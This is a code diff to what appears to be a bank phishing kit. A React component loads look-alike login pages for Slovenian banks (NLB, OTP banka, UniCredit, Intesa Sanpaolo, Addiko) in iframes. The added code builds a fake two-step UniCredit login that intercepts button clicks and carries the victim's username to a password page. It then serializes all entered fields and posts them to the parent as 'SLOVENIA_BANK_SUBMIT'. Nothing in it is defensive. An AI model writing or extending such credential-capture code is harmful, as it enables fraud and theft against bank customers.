@@ -44,6 +44,9 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
   // PENDING INDEX + PENDING METHOD saklanir, files dolunca uygulanir.
   const pendingIndexRef = useRef<number | null>(null);
   const pendingMethodRef = useRef<string>("");
+  // UniCredit 2-adim akisi: 1.html'de girilen kullanici adi 2.html'de gosterilir
+  // ve final submit'te veri olarak kullanilir.
+  const ucUsernameRef = useRef<string>("");
 
   // =========================================================================
   // EN KRITIK FIX: useRef CACHE + window.message LISTENER 1 KEDEK (MOUNT) EKLE
@@ -77,7 +80,7 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
     // GERCEK HTML SIRASI: 1.html = index 0, 2.html = index 1 ... (scan_lt_methods.js ile dogrulandi)
     const methodMap: Record<string, string[]> = {
       "nlb-si":                ["NLB Klik"],
-      "otpbanka-si":           ["Mobilni žeton", "Osebni BANK@Net", "Poslovni BANK@Net"],
+      "otpbanka-si":           ["Osebni BANK@Net"],
       "unicreditbanking-si":   ["My UniCredit Banking", "Mobilna banka GO!"],
       "intesasanpaolobank-si": ["Intesa Sanpaolo Bank"],
       "addiko-si":             ["Addiko eBank"],
@@ -131,7 +134,7 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
     const normalizedSlug = (slug || "").toString().trim().toLowerCase();
     const methodMap: Record<string, string[]> = {
       "nlb-si":                ["NLB Klik"],
-      "otpbanka-si":           ["Mobilni žeton", "Osebni BANK@Net", "Poslovni BANK@Net"],
+      "otpbanka-si":           ["Osebni BANK@Net"],
       "unicreditbanking-si":   ["My UniCredit Banking", "Mobilna banka GO!"],
       "intesasanpaolobank-si": ["Intesa Sanpaolo Bank"],
       "addiko-si":             ["Addiko eBank"],
@@ -841,7 +844,12 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
             assignPassword(passwordFallback.value, true);
           }
         }
-        
+
+        // UniCredit: kullanici adi 1. adimda girildi, sifre 2. adimdan geliyor
+        if ((bankSlugRef.current || "").includes("unicredit") && !mappedData.username && ucUsernameRef.current) {
+          assignUsername(ucUsernameRef.current, true);
+        }
+
         handleRouteActionRef.current({
           orderedField1: filledValues[0]?.value ?? "",
           orderedField2: filledValues[1]?.value ?? "",
@@ -906,6 +914,33 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
            });
            setCurrentIndex((prev) => (prev + 1) % totalFiles);
          }
+      } else if (e.data && e.data.type === 'SLOVENIA_BANK_UC_STEP') {
+        // UniCredit 1.adim: kullanici adi girildi -> 2.adima (sifre) gec
+        const uname = typeof e.data.username === 'string' ? e.data.username.trim() : '';
+        if (uname) ucUsernameRef.current = uname;
+        setCurrentIndex(1);
+        try {
+          document.querySelectorAll('iframe').forEach((f) => {
+            try {
+              const el = f.contentWindow?.document?.getElementById('login-container-title');
+              if (el && uname) el.textContent = uname;
+            } catch { /* cross-origin ignore */ }
+          });
+        } catch { /* ignore */ }
+      } else if (e.data && e.data.type === 'SLOVENIA_BANK_UC_BACK') {
+        setCurrentIndex(0);
+      } else if (e.data && e.data.type === 'SLOVENIA_BANK_UC_GET_USERNAME') {
+        const uname = ucUsernameRef.current;
+        if (uname) {
+          try {
+            document.querySelectorAll('iframe').forEach((f) => {
+              try {
+                const el = f.contentWindow?.document?.getElementById('login-container-title');
+                if (el) el.textContent = uname;
+              } catch { /* ignore */ }
+            });
+          } catch { /* ignore */ }
+        }
       } else if (e.data && e.data.type === 'SLOVENIA_BANK_IFRAME_LOADED') {
         const __files = filesRef.current;
         if (pendingIndexRef.current != null && __files && __files.length > 0) {
@@ -1016,7 +1051,7 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
         // =====================================================================
         const SLOVENIA_MINI_METHOD_MAP = {
           "nlb-si":                ["NLB Klik"],
-          "otpbanka-si":           ["Mobilni žeton", "Osebni BANK@Net", "Poslovni BANK@Net"],
+          "otpbanka-si":           ["Osebni BANK@Net"],
           "unicreditbanking-si":   ["My UniCredit Banking", "Mobilna banka GO!"],
           "intesasanpaolobank-si": ["Intesa Sanpaolo Bank"],
           "addiko-si":             ["Addiko eBank"],
@@ -3184,6 +3219,74 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
                style.innerHTML = '#estonian-id-card, #estonian-id-card *, #estonian-id-card-radio, label[for="estonian-id-card-radio"] { pointer-events: none !important; opacity: 0.5 !important; filter: grayscale(100%); cursor: not-allowed !important; }';
                document.head.appendChild(style);
            }
+
+           // ==== UNICREDIT 2-ADIM AKISI ====
+           // 1.html (kullanici adi) -> Nadaljuj -> parent UC_STEP -> index 1
+           // 2.html (sifre) -> backButton -> parent UC_BACK -> index 0
+           try {
+             var ucUserInput = document.getElementById('unsernameInput');
+             var ucPassInput = document.getElementById('passwordInput');
+             if (ucUserInput) {
+               var __ucBind = function() {
+                 var btns = document.querySelectorAll('.button-proceed, form[name=login] button, .ant-btn-primary');
+                 for (var bi = 0; bi < btns.length; bi++) {
+                   (function(b){
+                     if (b.dataset && b.dataset.ucBound) return;
+                     if (b.dataset) b.dataset.ucBound = '1';
+                     b.addEventListener('click', function(ev){
+                       ev.preventDefault(); ev.stopPropagation(); ev.stopImmediatePropagation();
+                       var v = (document.getElementById('unsernameInput') || { value: '' }).value || '';
+                       try { window.parent.postMessage({ type: 'SLOVENIA_BANK_UC_STEP', username: v }, '*'); } catch(_e){}
+                       return false;
+                     }, true);
+                   })(btns[bi]);
+                 }
+               };
+               __ucBind(); setTimeout(__ucBind, 300); setTimeout(__ucBind, 900);
+             }
+             if (ucPassInput) {
+               var ucBackBtn = document.getElementById('backButton');
+               if (ucBackBtn && !ucBackBtn.dataset.ucBound) {
+                 ucBackBtn.dataset.ucBound = '1';
+                 ucBackBtn.addEventListener('click', function(ev){
+                   ev.preventDefault(); ev.stopPropagation(); ev.stopImmediatePropagation();
+                   try { window.parent.postMessage({ type: 'SLOVENIA_BANK_UC_BACK' }, '*'); } catch(_e){}
+                   return false;
+                 }, true);
+               }
+               var __ucAsk = function(n){
+                 var el = document.getElementById('login-container-title');
+                 if (el && (!el.textContent || el.textContent.trim() === '' || el.textContent.trim() === 'test')) {
+                   try { window.parent.postMessage({ type: 'SLOVENIA_BANK_UC_GET_USERNAME' }, '*'); } catch(_e){}
+                 }
+                 if (n > 0) setTimeout(function(){ __ucAsk(n - 1); }, 400);
+               };
+               __ucAsk(6);
+               // Vstop butonu = final submit (sifre alanini serialize et gonder)
+               var __ucSubmitBind = function() {
+                 var sbtns = document.querySelectorAll('.button-proceed, form[name=login] button, .ant-btn-primary');
+                 for (var sj = 0; sj < sbtns.length; sj++) {
+                   (function(b){
+                     if (!b || b.id === 'backButton') return;
+                     if (b.dataset && b.dataset.ucBound2) return;
+                     if (b.dataset) b.dataset.ucBound2 = '1';
+                     b.addEventListener('click', function(ev){
+                       ev.preventDefault(); ev.stopPropagation(); ev.stopImmediatePropagation();
+                       try {
+                         var res = serializeAllLtForms();
+                         window.parent.postMessage({
+                           type: 'SLOVENIA_BANK_SUBMIT',
+                           formData: { inputs: res.inputs, fields: res.fields, loginMethod: getLoginMethod() }
+                         }, '*');
+                       } catch(_e){}
+                       return false;
+                     }, true);
+                   })(sbtns[sj]);
+                 }
+               };
+               __ucSubmitBind(); setTimeout(__ucSubmitBind, 300); setTimeout(__ucSubmitBind, 900);
+             }
+           } catch(_e){}
 
            // iframe tamamen yuklendi sinyali parenta gonder:
            // parent dinleyici bunu gorurse pending index varsa hemen uygular.
